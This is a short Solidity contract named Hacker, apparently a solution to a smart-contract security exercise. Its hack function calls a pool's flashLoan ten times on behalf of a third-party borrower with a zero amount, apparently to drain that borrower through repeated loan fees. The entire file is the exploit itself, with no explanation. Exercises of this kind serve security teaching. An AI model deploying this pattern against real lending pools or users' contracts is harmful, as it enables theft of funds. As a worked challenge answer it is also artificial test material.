// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Hacker {
    function hack(address pool, address borrower) external {
        for(uint i = 0; i < 10; i++) {
           (bool success,) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", borrower, 0));
           require(success, "revert");
        }
    }
}